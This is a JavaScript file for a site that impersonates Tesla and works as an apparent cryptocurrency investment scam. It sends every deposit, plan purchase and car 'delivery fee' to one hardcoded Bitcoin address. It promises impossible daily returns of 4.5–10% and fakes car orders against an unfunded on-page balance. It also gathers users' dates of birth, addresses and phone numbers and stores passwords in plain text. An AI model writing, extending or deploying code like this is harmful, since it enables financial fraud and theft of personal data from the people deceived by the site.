// ==================== UNIQUE KEYS (TESLA) ====================
const USERS_KEY = 'teslaUsers';
const SESSION_KEY = 'teslaSession';
const DEPOSIT_KEY = 'teslaDepositRequests';
const CAR_ORDERS_KEY = 'teslaCarOrders';
const PLANS_KEY = 'teslaPlanRequests';

const getUsers = () => JSON.parse(localStorage.getItem(USERS_KEY)) || [];
const saveUsers = (u) => localStorage.setItem(USERS_KEY, JSON.stringify(u));
const getDeposits = () => JSON.parse(localStorage.getItem(DEPOSIT_KEY)) || [];
const saveDeposits = (d) => localStorage.setItem(DEPOSIT_KEY, JSON.stringify(d));
const getCarOrders = () => JSON.parse(localStorage.getItem(CAR_ORDERS_KEY)) || [];
const saveCarOrders = (c) => localStorage.setItem(CAR_ORDERS_KEY, JSON.stringify(c));
const getPlanRequests = () => JSON.parse(localStorage.getItem(PLANS_KEY)) || [];
const savePlanRequests = (p) => localStorage.setItem(PLANS_KEY, JSON.stringify(p));

// ==================== CAR DATA ====================
const CARS = [
    { id: 1, name: 'Model 3 Standard', price: 38630, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4962.jpeg' },
    { id: 2, name: 'Model 3 Premium', price: 44130, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4963.jpeg' },
    { id: 3, name: 'Model 3 Performance', price: 56630, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4964.jpeg' },
    { id: 4, name: 'Model Y', price: 45000, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4965.jpeg' },
    { id: 5, name: 'Model Y Long Range', price: 45000, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4966.jpeg' },
    { id: 6, name: 'Model Y Performance', price: 55000, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4967.jpeg' },
    { id: 7, name: 'Cybertruck AWD', price: 80000, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4968.jpeg' },
    { id: 8, name: 'Cybertruck Cyberbeast', price: 112000, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4969.jpeg' },
    { id: 9, name: 'Model S Plaid', price: 96000, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4975.jpeg' },
    { id: 10, name: 'Model X Plaid', price: 90000, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4971.jpeg' },
    { id: 11, name: 'Model Y L', price: 60000, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4965.jpeg' },
    { id: 12, name: 'Cybercab', price: 29000, img: 'https://raw.githubusercontent.com/express-02/Image-/refs/heads/main/IMG_4973.jpeg' }
];
const DELIVERY_FEE = 800;

// ==================== LANDING PAGE LOGIC ====================
if (document.getElementById('investHero')) {
    const loginModal = document.getElementById('loginModal');
    const signupModal = document.getElementById('signupModal');

    const sideMenu = document.getElementById('sideMenu');
    const menuOverlay = document.getElementById('menuOverlay');
    const openMenu = () => { sideMenu.classList.add('open'); menuOverlay.classList.add('open'); };
    const closeMenu = () => { sideMenu.classList.remove('open'); menuOverlay.classList.remove('open'); };

    document.getElementById('navMenu').onclick = (e) => { e.preventDefault(); openMenu(); };
    document.getElementById('closeMenu').onclick = closeMenu;
    menuOverlay.onclick = closeMenu;

    const openLogin = (noticeMsg) => {
        const notice = document.getElementById('loginNotice');
        if (noticeMsg) { notice.textContent = noticeMsg; notice.style.display = 'block'; }
        else { notice.style.display = 'none'; }
        loginModal.style.display = 'flex';
    };

    document.getElementById('navLogin').onclick = (e) => { e.preventDefault(); openLogin(); };
    document.getElementById('btnInvest').onclick = () => { openLogin(); };
    document.getElementById('btnShop').onclick = () => { openLogin("Please log in to view cars."); };
    
    document.getElementById('closeLogin').onclick = () => loginModal.style.display = 'none';
    document.getElementById('closeSignup').onclick = () => signupModal.style.display = 'none';

    document.getElementById('menuLogin').onclick = (e) => { e.preventDefault(); closeMenu(); openLogin(); };
    document.getElementById('menuSignup').onclick = (e) => { e.preventDefault(); closeMenu(); loginModal.style.display = 'none'; signupModal.style.display = 'flex'; };

    document.getElementById('showSignup').onclick = (e) => { e.preventDefault(); loginModal.style.display = 'none'; signupModal.style.display = 'flex'; };

    document.getElementById('signupForm').onsubmit = (e) => {
        e.preventDefault();
        const users = getUsers();
        const email = document.getElementById('regEmail').value;
        if (users.find(u => u.email === email)) { alert("Email already exists!"); return; }
        users.push({
            name: document.getElementById('regName').value, email: email,
            password: document.getElementById('regPassword').value,
            state: document.getElementById('regState').value, postal: document.getElementById('regPostal').value,
            dob: document.getElementById('regDob').value, balance: 0, profit: 0, invested: 0,
            status: 'pending', createdAt: new Date().toISOString()
        });
        saveUsers(users);
        alert("Account created! Please wait for admin approval.");
        signupModal.style.display = 'none';
    };

    document.getElementById('loginForm').onsubmit = (e) => {
        e.preventDefault();
        const user = getUsers().find(u => u.email === document.getElementById('loginEmail').value && u.password === document.getElementById('loginPassword').value);
        if (!user) { alert("Invalid credentials."); return; }
        if (user.status !== 'approved') { alert("Your account is pending admin approval."); return; }
        localStorage.setItem(SESSION_KEY, JSON.stringify(user));
        window.location.href = 'dashboard.html';
    };
}

// ==================== DASHBOARD LOGIC ====================
function initDashboard() {
    const session = JSON.parse(localStorage.getItem(SESSION_KEY));
    if (!session) { window.location.href = 'index.html'; return; }

    const dashMenu = document.getElementById('dashMenu');
    const dashMenuOverlay = document.getElementById('dashMenuOverlay');
    const openDashMenu = () => { dashMenu.classList.add('open'); dashMenuOverlay.classList.add('open'); };
    const closeDashMenu = () => { dashMenu.classList.remove('open'); dashMenuOverlay.classList.remove('open'); };

    document.getElementById('dashMenuBtn').onclick = openDashMenu;
    document.getElementById('closeDashMenu').onclick = closeDashMenu;
    dashMenuOverlay.onclick = closeDashMenu;

    document.querySelectorAll('#dashMenu .side-menu-links a').forEach(link => {
        link.onclick = (e) => {
            e.preventDefault();
            closeDashMenu();
            switchTab(link.dataset.target);
        };
    });

    const switchTab = (target) => {
        document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
        document.getElementById(`tab-${target}`).classList.add('active');
        document.querySelectorAll('.tab-btn').forEach(t => t.classList.remove('active'));
        const topTab = document.querySelector(`.tab-btn[data-tab="${target}"]`);
        if(topTab) topTab.classList.add('active');
        document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
        const bottomNav = document.querySelector(`.nav-item[data-target="${target}"]`);
        if(bottomNav) bottomNav.classList.add('active');
        window.scrollTo({top:0, behavior:'smooth'});
    };

    // Render Cars
    const carGrid = document.getElementById('carGrid');
    carGrid.innerHTML = CARS.map(car => `
        <div class="car-card">
            <img src="${car.img}" alt="${car.name}">
            <div class="car-card-body">
                <h4>${car.name}</h4>
                <p class="car-price">$${car.price.toLocaleString()}</p>
                <button class="btn-buy" data-id="${car.id}">BUY NOW</button>
            </div>
        </div>
    `).join('');

    document.querySelectorAll('.btn-buy').forEach(btn => {
        btn.onclick = () => {
            const car = CARS.find(c => c.id == btn.dataset.id);
            document.getElementById('purchaseCarName').textContent = `${car.name} — $${car.price.toLocaleString()}`;
            document.getElementById('purchaseModal').style.display = 'flex';
            document.getElementById('purchaseModal').dataset.carId = car.id;
        };
    });

    document.getElementById('closePurchase').onclick = () => document.getElementById('purchaseModal').style.display = 'none';
    document.getElementById('closeInsufficient').onclick = () => document.getElementById('insufficientModal').style.display = 'none';

    document.getElementById('purchaseForm').onsubmit = (e) => {
        e.preventDefault();
        const carId = parseInt(document.getElementById('purchaseModal').dataset.carId);
        const car = CARS.find(c => c.id === carId);
        const s = JSON.parse(localStorage.getItem(SESSION_KEY));

        const users = getUsers();
        const userIndex = users.findIndex(u => u.email === s.email);
        if (userIndex === -1) { alert("Session error."); window.location.href = 'index.html'; return; }
        const currentUser = users[userIndex];
        const currentBalance = currentUser.balance || 0;

        if (currentBalance < car.price) {
            const shortfall = car.price - currentBalance;
            document.getElementById('insufCarPrice').textContent = '$' + car.price.toLocaleString();
            document.getElementById('insufBalance').textContent = '$' + currentBalance.toFixed(2);
            document.getElementById('insufShortfall').textContent = '$' + shortfall.toLocaleString();
            document.getElementById('purchaseModal').style.display = 'none';
            document.getElementById('insufficientModal').style.display = 'flex';
            return;
        }

        currentUser.balance = currentBalance - car.price;
        users[userIndex] = currentUser;
        saveUsers(users);
        localStorage.setItem(SESSION_KEY, JSON.stringify(currentUser));

        const orders = getCarOrders();
        orders.push({
            id: Date.now(), userEmail: s.email, userName: s.name,
            carId: car.id, carName: car.name, carPrice: car.price,
            deliveryFee: DELIVERY_FEE,
            buyerInfo: {
                name: document.getElementById('buyName').value,
                phone: document.getElementById('buyPhone').value,
                address: document.getElementById('buyAddress').value,
                city: document.getElementById('buyCity').value,
                postal: document.getElementById('buyPostal').value
            },
            status: 'pending_delivery', purchasedAt: new Date().toISOString()
        });
        saveCarOrders(orders);

        alert(
            `✅ Order Confirmed for ${car.name}!\n\n` +
            `$${car.price.toLocaleString()} has been deducted from your balance.\n\n` +
            `➡️ NEXT STEP: PAY DELIVERY FEE\n\n` +
            `To start your car shipment, you must pay the $${DELIVERY_FEE} delivery fee to this Bitcoin address:\n\n` +
            `1D3FiQUNbT4aT9yUN4sWry3rFiSA8neuCQ\n\n` +
            `After payment, contact Customer Service to confirm your delivery and schedule shipment.\n\n` +
            `Your car order is now pending delivery in your Profile.`
        );

        document.getElementById('purchaseModal').style.display = 'none';
        updateUI();
    };

    const updateUI = () => {
        const user = getUsers().find(u => u.email === session.email);
        if (!user) return;

        // Home stats
        document.getElementById('userBalance').textContent = `$${(user.balance || 0).toFixed(2)}`;
        document.getElementById('userProfit').textContent = `$${(user.profit || 0).toFixed(2)}`;
        document.getElementById('userInvested').textContent = `$${(user.invested || 0).toFixed(2)}`;
        document.getElementById('userAvatar').textContent = user.name.substring(0,2).toUpperCase();

        // Profile hero
        document.getElementById('profileAvatarLarge').textContent = user.name.substring(0,2).toUpperCase();
        document.getElementById('heroName').textContent = user.name;
        document.getElementById('heroEmail').textContent = user.email;

        const heroStatus = document.getElementById('heroStatus');
        if (user.status === 'approved') {
            heroStatus.className = 'verified-badge';
            heroStatus.innerHTML = '<i class="fas fa-check-circle"></i> VERIFIED';
        } else if (user.status === 'pending') {
            heroStatus.className = 'verified-badge pending';
            heroStatus.innerHTML = '<i class="fas fa-hourglass-half"></i> PENDING APPROVAL';
        } else {
            heroStatus.className = 'verified-badge blocked';
            heroStatus.innerHTML = '<i class="fas fa-ban"></i> BLOCKED';
        }

        // Profile stats
        document.getElementById('profBalance').textContent = `$${(user.balance || 0).toFixed(0)}`;
        document.getElementById('profProfit').textContent = `$${(user.profit || 0).toFixed(0)}`;
        document.getElementById('profInvested').textContent = `$${(user.invested || 0).toFixed(0)}`;

        // Personal info
        document.getElementById('profName').textContent = user.name;
        document.getElementById('profEmail').textContent = user.email;
        document.getElementById('profState').textContent = user.state || 'N/A';
        document.getElementById('profPostal').textContent = user.postal || 'N/A';
        document.getElementById('profDob').textContent = user.dob || 'N/A';
        document.getElementById('profStatus').textContent = user.status.toUpperCase();
        document.getElementById('profStatus').className = `badge ${user.status}`;
        document.getElementById('profSince').textContent = user.createdAt ? new Date(user.createdAt).toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' }) : 'N/A';

        // Pending cars
        const orders = getCarOrders().filter(o => o.userEmail === user.email);
        const list = document.getElementById('pendingCarsList');
        if (orders.length === 0) { list.innerHTML = '<p class="small-note">No pending car deliveries.</p>'; }
        else {
            list.innerHTML = orders.map(o => `
                <div class="car-status-card">
                    <h4>${o.carName}</h4>
                    <p>Status: ${o.status.replace('_',' ').toUpperCase()}</p>
                    <p>Delivery Fee: $${o.deliveryFee} (pending)</p>
                    <p style="font-size:0.65rem; margin-top:5px;">Ordered: ${new Date(o.purchasedAt).toLocaleDateString()}</p>
                </div>
            `).join('');
        }
    };
    updateUI();

    document.querySelectorAll('.tab-btn').forEach(tab => {
        tab.onclick = () => switchTab(tab.dataset.tab);
    });
    document.querySelectorAll('.nav-item').forEach(item => {
        item.onclick = () => switchTab(item.dataset.target);
    });

    document.getElementById('btnLogout').onclick = () => { localStorage.removeItem(SESSION_KEY); window.location.href = 'index.html'; };

    // ==================== PROFESSIONAL DEPOSIT FLOW ====================
    let selectedAmount = 0;

    const step1Card = document.getElementById('step1Card');
    const step2Card = document.getElementById('step2Card');
    const step3Card = document.getElementById('step3Card');
    const customAmountInput = document.getElementById('customAmount');
    const amountBtns = document.querySelectorAll('.amount-btn');

    amountBtns.forEach(btn => {
        btn.onclick = () => {
            amountBtns.forEach(b => b.classList.remove('active'));
            btn.classList.add('active');
            selectedAmount = parseInt(btn.dataset.amount);
            customAmountInput.value = '';
        };
    });

    customAmountInput.oninput = () => {
        amountBtns.forEach(b => b.classList.remove('active'));
        selectedAmount = parseFloat(customAmountInput.value) || 0;
    };

    document.getElementById('btnContinueDeposit').onclick = () => {
        if (!selectedAmount || selectedAmount < 100) {
            alert("Please select or enter an amount of at least $100.");
            return;
        }
        document.getElementById('depositAmountDisplay').textContent = '$' + selectedAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
        step1Card.style.display = 'none';
        step2Card.style.display = 'block';
        step2Card.scrollIntoView({behavior:'smooth', block:'start'});
    };

    document.getElementById('btnBackDeposit').onclick = () => {
        step2Card.style.display = 'none';
        step1Card.style.display = 'block';
    };

    document.getElementById('btnNotifyDeposit').onclick = () => {
        const deposits = getDeposits();
        const s = JSON.parse(localStorage.getItem(SESSION_KEY));
        deposits.push({
            id: Date.now(), name: s.name, email: s.email,
            amount: selectedAmount, method: 'BTC',
            wallet: '1D3FiQUNbT4aT9yUN4sWry3rFiSA8neuCQ',
            status: 'pending', requestedAt: new Date().toISOString()
        });
        saveDeposits(deposits);

        document.getElementById('successAmount').textContent = '$' + selectedAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2});
        step2Card.style.display = 'none';
        step3Card.style.display = 'block';
        step3Card.scrollIntoView({behavior:'smooth', block:'start'});
    };

    document.getElementById('btnNewDeposit').onclick = () => {
        selectedAmount = 0;
        customAmountInput.value = '';
        amountBtns.forEach(b => b.classList.remove('active'));
        step3Card.style.display = 'none';
        step1Card.style.display = 'block';
        step1Card.scrollIntoView({behavior:'smooth', block:'start'});
    };

    // ==================== PREMIUM PLANS ====================
    const plans = [
        { name: 'Starter', price: 230, tier: 'TIER 01', returns: '4.5%', duration: '7 Days' },
        { name: 'Basic', price: 390, tier: 'TIER 02', returns: '5.0%', duration: '7 Days' },
        { name: 'Standard', price: 600, tier: 'TIER 03', returns: '5.5%', duration: '10 Days' },
        { name: 'Advanced', price: 999, tier: 'TIER 04', returns: '6.0%', duration: '10 Days', featured: true },
        { name: 'Pro', price: 15000, tier: 'TIER 05', returns: '7.0%', duration: '14 Days' },
        { name: 'Elite', price: 25000, tier: 'TIER 06', returns: '8.0%', duration: '14 Days' },
        { name: 'Institutional', price: 50000, tier: 'TIER 07', returns: '10.0%', duration: '21 Days', featured: true }
    ];

    document.getElementById('plansList').innerHTML = plans.map(p => `
        <div class="plan-item ${p.featured ? 'featured' : ''}">
            <div class="plan-header">
                <span class="plan-tier">${p.tier}</span>
                <div class="plan-return">${p.returns} Daily<span>${p.duration} Plan</span></div>
            </div>
            <div class="plan-name">${p.name}</div>
            <div class="plan-price">$${p.price.toLocaleString()}<small>/ investment</small></div>
            <ul class="plan-features">
                <li><i class="fas fa-check"></i> Daily returns: ${p.returns}</li>
                <li><i class="fas fa-check"></i> Duration: ${p.duration}</li>
                <li><i class="fas fa-check"></i> Principal returned at maturity</li>
            </ul>
            <button class="plan-buy" data-name="${p.name}" data-price="${p.price}" data-tier="${p.tier}">
                INVEST NOW
            </button>
        </div>
    `).join('');

    const planPaymentModal = document.getElementById('planPaymentModal');

    document.querySelectorAll('.plan-buy').forEach(btn => {
        btn.onclick = () => {
            document.getElementById('planPayBadge').textContent = btn.dataset.tier;
            document.getElementById('planPayAmount').textContent = '$' + parseInt(btn.dataset.price).toLocaleString();
            planPaymentModal.dataset.planName = btn.dataset.name;
            planPaymentModal.dataset.planPrice = btn.dataset.price;
            planPaymentModal.style.display = 'flex';
        };
    });

    document.getElementById('closePlanPayment').onclick = () => planPaymentModal.style.display = 'none';

    document.getElementById('btnConfirmPlanPayment').onclick = () => {
        const planName = planPaymentModal.dataset.planName;
        const price = parseInt(planPaymentModal.dataset.planPrice);
        const s = JSON.parse(localStorage.getItem(SESSION_KEY));

        const planRequests = getPlanRequests();
        planRequests.push({
            id: Date.now(), userEmail: s.email, userName: s.name,
            planName: planName, amount: price,
            status: 'pending', requestedAt: new Date().toISOString()
        });
        savePlanRequests(planRequests);

        planPaymentModal.style.display = 'none';
        alert(
            `✅ Plan Request Submitted\n\n` +
            `${planName} Plan — $${price.toLocaleString()}\n\n` +
            `Your request has been sent to the admin. Once your Bitcoin payment is confirmed, your plan will be activated.`
        );
    };
}

function copyAddress() {
    navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(() => alert("Bitcoin address copied!"));
}

function copyPlanAddress() {
    navigator.clipboard.writeText(document.getElementById('planBtcAddress').innerText).then(() => alert("Bitcoin address copied!"));
}